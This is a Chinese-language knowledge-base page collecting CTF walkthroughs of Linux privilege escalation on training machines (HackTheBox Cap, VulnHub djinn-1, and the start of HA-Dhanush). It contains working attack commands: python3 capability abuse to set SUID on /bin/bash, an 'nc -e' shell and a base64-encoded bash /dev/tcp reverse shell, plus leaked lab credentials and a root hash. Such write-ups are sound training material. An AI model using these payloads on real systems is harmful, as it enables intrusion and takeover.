---
title: Linux 权限、Capabilities 与周期任务
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/linux/
categories:
- 系统安全
- Linux权限
tags:
- 知识库
- sudo
- GTFOBins
- SUID
- 计划任务
- FTP
- PCAP
- Capabilities
- 访问控制
- 命令注入
- 输入过滤
- SSH
- PATH
description: 从服务用户到 root，需要追踪 sudo、SUID、capabilities、目录 ACL 和任务的实际运行身份。本章按原实验保留环境变量、文件所有者、任务触发和输出，便于检查条件是否成立。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

从服务用户到 root，需要追踪 sudo、SUID、capabilities、目录 ACL 和任务的实际运行身份。本章按原实验保留环境变量、文件所有者、任务触发和输出，便于检查条件是否成立。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/linux/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Cap 的 Python capabilities、NullByte 的 PATH 和 Pit 的目录 ACL 属于不同权限机制。

HA-Dhanush、Sunset 和 WTF 保留工具委托执行的参数与身份变化。

Djinn、Tr0ll 与 SickOs 的自定义程序、清理任务和代理条件都有失败与成功记录。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [PCAP 凭据与 Python capabilities](#case-cap) | cap | PCAP、Capabilities、访问控制 |
| [命令过滤与自定义 sudo 程序](#case-djinn-1) | djinn-1 | 命令注入、sudo、输入过滤 |
| [cp 与 zip 的委托执行权限](#case-ha-dhanush) | HA-Dhanush | sudo、GTFOBins、SSH |
| [PATH 解析与 SUID 子进程](#case-nullbyte-1) | NullByte-1 | PATH、SUID、MySQL |
| [SNMP 扩展命令与目录 ACL](#case-pit) | pit | SNMP、ACL、计划任务 |
| [代理可达性与 CMS 文件权限](#case-sickos-1-1) | SickOs-1-1 | Squid、文件上传、凭据复用 |
| [FTP 备份哈希与编辑器权限](#case-sunset-1) | sunset-1 | FTP、密码审计、GTFOBins |
| [历史流量线索与可写清理任务](#case-tr0ll-1) | Tr0ll-1 | FTP、计划任务、OverlayFS |
| [无线捕获、编辑历史与权限程序](#case-tr0ll-3) | Tr0ll-3 | 无线取证、SUID、凭据泄露 |
| [既有回连配置与 sudo pip](#case-wtf-1) | WTF-1 | 网络配置、pip、sudo |

<a id="case-cap"></a>

## PCAP 凭据与 Python capabilities

可下载的 PCAP 中包含 FTP 凭据，而本地 Python 的 capabilities 改变了 setuid 的权限条件。证据覆盖 Web 对象访问和本地进程能力。

<p class="kb-provenance">来源 cap · 原记录 2021-06-06 · 11 个代码块 · 7 处图片引用</p>

<details class="kb-evidence" id="record-cap">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start cap -->

#### introduce

OS: Linux
Difficulty: Easy
Points:	20
Release:	05 Jun 2021
IP:	10.10.10.245

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1994.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/cap]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.245
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```

There are three ports open 21:ftp 22:ssh 80:http

Let's start with ftp let's check anonymous login is allowed or not.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/cap]
└─# ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```

Login failed! now let's go on with port-80

#### Port-80

It's a simple admin-panel.

After some manual enumeration i find nothing. let's find some directories with help of gobuster.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/cap]
└─# gobuster dir -u http://10.10.10.245/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.245/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/05 21:28:05 Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
/ip                   (Status: 200) [Size: 17464]                         
/capture              (Status: 302) [Size: 220] [--> http://10.10.10.245/data/7]
                                                                                
===============================================================
2021/06/05 21:29:08 Finished
===============================================================
```

/data directory look interesting let's go and check that.

It's said not found it's mean that the directory is exist but we need to find the file.

Let's enumerate further inside /data directory with wfuzz.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/cap]
└─# wfuzz -u http://10.10.10.245/data/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --hc 302,404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.245/data/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                           
=====================================================================

000000051:   200        370 L    993 W      17149 Ch    "2"                                                               
000000048:   200        370 L    993 W      17152 Ch    "01"                                                              
000000060:   200        370 L    993 W      17143 Ch    "03"                                                              
000000045:   200        370 L    993 W      17152 Ch    "1"                                                               
000000070:   200        370 L    993 W      17143 Ch    "3"                                                               
000000064:   200        370 L    993 W      17149 Ch    "02"                                                              
000000124:   200        370 L    993 W      17146 Ch    "0"                                                               
000000713:   200        370 L    993 W      17146 Ch    "00"                                                              
000001803:   200        370 L    993 W      17152 Ch    "001"                                                             
000002265:   200        370 L    993 W      17149 Ch    "002"                                                             
000002586:   200        370 L    993 W      17146 Ch    "000"                                                             
000003042:   200        370 L    993 W      17143 Ch    "003"                                                             
000004236:   200        370 L    993 W      17152 Ch    "0001"                                                            
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 62.40377
Processed Requests: 5127
Filtered Requests: 5114
Requests/sec.: 82.15849
```

There are so many files found inside /data directory. after hit and try every file inside directory i found a interesting file called 00.

So let's go to this url -> 10.10.10.245/data/00

And in there we found a download button let's download that file.

After downloading the file we found that it's a .pcap file let's open this file in wireshark.

And inside wireshark we see there is good amount of ftp request going.

I apply a filter to see only ftp req and we found a username and password that's try to login in ftp and they got successful login.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1995.jpg)

``` bash
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
```

Now let's try to login with these creads inside ftp.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/cap]
└─# ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:root): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Jun 02 13:50 user.txt
226 Directory send OK.
```

We see that we can view inside nathan home directory it's mean we can login inside ssh also.

Let's try that.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/cap]
└─# ssh nathan@10.10.10.245
The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
ECDSA key fingerprint is SHA256:8TaASv/TRhdOSeq3woLxOcKrIOtDhrZJVrrE0WbzjSc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.245' (ECDSA) to the list of known hosts.
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun  6 09:55:09 UTC 2021

  System load:           0.0
  Usage of /:            35.2% of 8.73GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             234
  Users logged in:       1
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:feb9:26d2

  => There is 1 zombie process.




Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jun  6 04:45:03 2021 from 10.10.16.132
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
nathan@cap:~$ whoami
nathan
nathan@cap:~$ cat user.txt
654905b014e892c542fb818e05e34a79
```

And we got login let's get the user.txt file.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1996.jpg)

#### Privilege escalation

let's run linPEAS.

After analyzing the linPEAS output i found a capabilities tab that has python3.8.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1997.jpg)

Let's check that binary if they have root privilege or not.

``` bash
nathan@cap:~$ ls -la /usr/bin/ | grep -i python3
lrwxrwxrwx  1 root   root          23 Jan 27 15:41 pdb3.8 -> ../lib/python3.8/pdb.py
lrwxrwxrwx  1 root   root          31 Mar 13  2020 py3versions -> ../share/python3/py3versions.py
lrwxrwxrwx  1 root   root           9 Mar 13  2020 python3 -> python3.8
lrwxrwxrwx  1 root   root          16 Mar 13  2020 python3-config -> python3.8-config
-rwxr-xr-x  1 root   root     5486384 Jan 27 15:41 python3.8
lrwxrwxrwx  1 root   root          33 Jan 27 15:41 python3.8-config -> x86_64-linux-gnu-python3.8-config
lrwxrwxrwx  1 root   root          33 Mar 13  2020 x86_64-linux-gnu-python3-config -> x86_64-linux-gnu-python3.8-config
-rwxr-xr-x  1 root   root        3240 Jan 27 15:41 x86_64-linux-gnu-python3.8-config
```

The binary has own by root let's run the python3 binary which has symlink to python3.8.

And we also change the suid to 0 becuase 0 is always root.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1998.jpg)

Let's check first with whoami command.

``` bash
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("whoami")'
root
```

And we got the output root now with root privilege let's change the permission to suid bit set of /bin/bash binary so any user can execute that and get root privilege.

``` bash
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("chmod +s /bin/bash")'
nathan@cap:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
nathan@cap:~$ /bin/bash -p
bash-5.0# id
uid=1001(nathan) gid=1001(nathan) euid=0(root) egid=0(root) groups=0(root),1001(nathan)
bash-5.0# whoami
root
bash-5.0# cd
bash-5.0# ls
user.txt
bash-5.0# cd /root
bash-5.0# cat root.txt
3d1f4a130d6acf43f869c2c96cf065fa
```

``` bash
bash-5.0# cat /etc/shadow | grep root
root:$6$8vQCitG5q4/cAsI0$Ey/2luHcqUjzLfwBWtArUls9.IlVMjqudyWNOUFUGDgbs9T0RqxH6PYGu/ya6yG0MNfeklSnBLlOskd98Mqdm0:18762:0:99999:7:::
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1999.jpg)

#### Summary of knowledge

 - use wfuzz fuzz directory
 - use wireshark get ftp username and password from a .pcap file
 - python3 -c 'import os; os.setuid(0); os.system("chmod +s /bin/bash")' to privesc

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end cap -->

</details>

<a id="case-djinn-1"></a>

## 命令过滤与自定义 sudo 程序

原文保留交互服务中的命令绕过、敏感文件和自定义程序权限变化。编码载荷、标准输入及运行用户都跟随记录呈现。

<p class="kb-provenance">来源 djinn-1 · 原记录 2020-05-21 · 25 个代码块 · 2 处图片引用</p>

<details class="kb-evidence" id="record-djinn-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start djinn-1 -->

#### name

Name: djinn: 1
Date release: 18 Nov 2019

#### download

Download: https://drive.google.com/file/d/1LlT5JcdlyDUcvkn12t9oIIFo0X9Gt53B/view?usp=sharing
Download (Mirror): https://download.vulnhub.com/djinn/djinn.ova
Download (Torrent): https://download.vulnhub.com/djinn/djinn.ova.torrent

#### description

 - Level: Beginner-Intermediate
 - flags: user.txt and root.txt
 - Description: The machine is VirtualBox as well as VMWare compatible. The DHCP will assign an IP automatically. You'll see the IP right on the login screen. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively.
 - Format: Virtual Machine (Virtualbox - OVA)
 - Operating System: Linux



#### information gathering

first use nmap as usual

``` bash
root@kali:~# nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.127
Host is up (0.00013s latency).
MAC Address: 08:00:27:03:DB:2D (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -sV -sC -v -p- -T4 192.168.56.127
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.126
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '*', 9)
|   RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '+', 5)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
|_http-title: Lost in space
```

 - Enumeration

ftp anonymous login, then get three files

``` bash
root@kali:~/vulnhub/djinn-1# ftp 192.168.56.127
Connected to 192.168.56.127.
220 (vsFTPd 3.0.3)
Name (192.168.56.127:root): anonymous 
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
ftp> get creds.txt
local: creds.txt remote: creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for creds.txt (11 bytes).
226 Transfer complete.
11 bytes received in 0.00 secs (109.6142 kB/s)
ftp> get game.txt
local: game.txt remote: game.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for game.txt (128 bytes).
226 Transfer complete.
128 bytes received in 0.02 secs (7.0244 kB/s)
ftp> get message.txt
local: message.txt remote: message.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for message.txt (113 bytes).
226 Transfer complete.
113 bytes received in 0.05 secs (2.4331 kB/s)
```

use cat command to check the content

``` bash
root@kali:~/vulnhub/djinn-1# cat creds.txt 
nitu:81299
root@kali:~/vulnhub/djinn-1# cat game.txt 
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.
root@kali:~/vulnhub/djinn-1# cat message.txt 
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And don't mess up anything.
```

use Netcat to make a connection so that we can play the game

``` bash
root@kali:~# nc 192.168.56.127 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(9, '+', 9)
> 18
(3, '-', 1)
> 2
(2, '/', 3)
> 2
Wrong answer
```

it's just a  waste time game, go for next step

``` bash
http://192.168.56.127:7331/
```

use gobuster for dir

``` bash
gobuster dir -u http://192.168.56.127:7331/ -w /usr/share/wordlists/dirb/big.txt -t 500
/genie (Status: 200)
/wish (Status: 200)
```

genie page is an error 403,perhaps it's no use
the following page is a little interesting

``` bash
http://192.168.56.127:7331/wish
```

this page can excecute commands

request:

``` bash
POST /wish HTTP/1.1
Host: 192.168.56.127:7331
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Origin: http://192.168.56.127:7331
Connection: close
Referer: http://192.168.56.127:7331/wish
Upgrade-Insecure-Requests: 1

cmd=id
```

response:

``` bash
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 379
Location: http://192.168.56.127:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
Server: Werkzeug/0.16.0 Python/2.7.15+
Date: Sat, 23 May 2020 05:03:45 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A">/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A</a>.  If not click the link.
```

 - Exploitation

get a shell by using nc

``` bash
nc -e /bin/sh 192.168.56.126 1155
```

excecute the payload, we got the following error

``` bash
http://192.168.56.127:7331/genie?name=Wrong+choice+of+words
```

some of the symbols are characters are restricted

we can use other payload, encrypt the whole command in base64 format 

``` bash
bash -i >& /dev/tcp/192.168.56.126/8080 0>&1
```

``` bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEyNi84MDgwIDA+JjE= | base64 -d | bash
```

then we get a shell

``` bash
root@kali:~# nc -lvp 8080
listening on [any] 8080 ...
192.168.56.127: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.126] from (UNKNOWN) [192.168.56.127] 47358
bash: cannot set terminal process group (758): Inappropriate ioctl for device
bash: no job control in this shell
www-data@djinn:/opt/80$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@djinn:/opt/80$ whoami
whoami
www-data
```

let's take a look around

``` bash
www-data@djinn:/opt/80$ cat app.py
cat app.py
import subprocess

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
app.secret_key = "key"

CREDS = "/home/nitish/.dev/creds.txt"

RCE = ["/", ".", "?", "*", "^", "$", "eval", ";"]


def validate(cmd):
    if CREDS in cmd and "cat" not in cmd:
        return True

    try:
        for i in RCE:
            for j in cmd:
                if i == j:
                    return False
        return True
    except Exception:
        return False


@app.route("/", methods=["GET"])
def index():
    return render_template("main.html")


@app.route("/wish", methods=['POST', "GET"])
def wish():
    execute = request.form.get("cmd")
    if execute:
        if validate(execute):
            output = subprocess.Popen(execute, shell=True,
                                      stdout=subprocess.PIPE).stdout.read()
        else:
            output = "Wrong choice of words"

        return redirect(url_for("genie", name=output))
    else:
        return render_template('wish.html')


@app.route('/genie', methods=['GET', 'POST'])
def genie():
    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = "It's not that hard"

    return render_template('genie.html', file=page)


if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)
```

``` bash
cat /home/nitish/.dev/creds.txt
nitish:p4ssw0rdStr3r0n9
```

change our shell to a tty shell

``` bash
www-data@djinn:/opt/80$ python -c 'import pty;pty.spawn("/bin/sh")'
python -c 'import pty;pty.spawn("/bin/sh")'
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ su nitish
su nitish
Password: p4ssw0rdStr3r0n9

nitish@djinn:/opt/80$ id
id
uid=1001(nitish) gid=1001(nitish) groups=1001(nitish)
nitish@djinn:/opt/80$ whoami
whoami
nitish
```

finally, we get user.txt...

``` bash
nitish@djinn:/opt/80$ cd ~
cd ~
nitish@djinn:~$ ls
ls
user.txt
nitish@djinn:~$ cat user.txt
cat user.txt
10aay8289ptgguy1pvfa73alzusyyx3c
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub276.jpg)


#### Post Exploitation

``` bash
nitish@djinn:~$ sudo -l                                                                              
sudo -l                                                                                              
Matching Defaults entries for nitish on djinn:                                                       
    env_reset, mail_badpass,                                                                         
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin         

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```

understand how it works

``` bash
nitish@djinn:~$ genie
genie
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
genie: error: the following arguments are required: wish
nitish@djinn:~$ genie -h
genie -h
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command
```

now we get a shell of user sam

``` bash
nitish@djinn:~$ sudo -u sam genie -cmd new
sudo -u sam genie -cmd new
my man!!
$ id
id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
$ whoami
whoami
sam
```

use the following command to get a stable shell,then enumerate again

``` bash
$ bash
bash
sam@djinn:~$ sudo -l
sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```

#### Privilege Escalation

and we get root

``` bash
sam@djinn:~$ sudo -u root /root/lago 
sudo -u root /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
2
Choose a number between 1 to 100: 
Enter your number: num
num
# id
id
uid=0(root) gid=0(root) groups=0(root)
# whoami
whoami
root
```

next, we try to find the flag

``` bash
# bash
bash
root@djinn:~# su root
su root
root@djinn:/home/nitish# cd
root@djinn:~# ls
ls
lago  proof.sh
root@djinn:~# ./proof.sh
./proof.sh
'unknown': I need something more specific.
    _                        _             _ _ _ 
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/       
djinn pwned...
__________________________________________________________________________

Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc
Path: /root
Date: Sat May 23 11:23:39 IST 2020
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub277.jpg)

#### Summary of knowledge

 - Command execution bypass
 - Sensitive information disclosure
 - custom program Privilege Escalation

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end djinn-1 -->

</details>

<a id="case-ha-dhanush"></a>

## cp 与 zip 的委托执行权限

页面词汇和登录结果提供账户，sudo cp 跨越用户目录边界，sudo zip 的执行能力连接 root。原记录保留公钥权限和每一步身份变化。

<p class="kb-provenance">来源 HA-Dhanush · 原记录 2019-12-17 · 11 个代码块 · 2 处图片引用</p>

<details class="kb-evidence" id="record-ha-dhanush">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start HA-Dhanush -->

名称：HA: Dhanush
发布日期：2019年11月9日

级别：中级
任务：枚举目标计算机并获得root用户访问权限。

下载：

 - Download: [https://drive.google.com/file/d/1BfOvrrIqkVeeEhv3j7yASKmVNw-84s3L/view?usp=sharing](https://drive.google.com/file/d/1BfOvrrIqkVeeEhv3j7yASKmVNw-84s3L/view?usp=sharing)
 - Download (Mirror): [https://download.vulnhub.com/ha/dhanush.zip](https://download.vulnhub.com/ha/dhanush.zip)
 - Download (Torrent): [https://download.vulnhub.com/ha/dhanush.zip.torrent](https://download.vulnhub.com/ha/dhanush.zip.torrent)

描述：

Dhanush曾经是武器技术的巅峰之作。 它把战争重新定义到了一个新的高度，并在历史上的所有神话记载中都提到过。
选择你的Dhanush，拉伸琴弦并射击以获取root！枚举是关键！！！！有关印度神话和弓箭的一些信息可能会有所帮助。



#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.142.0/24
Nmap scan report for 192.168.142.131
Host is up (0.00030s latency).
MAC Address: 00:0C:29:22:66:8B (VMware)
```

``` bash
root@kali:~# nmap -A -v -sV -Pn -T4 --script=vuln 192.168.142.131
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider
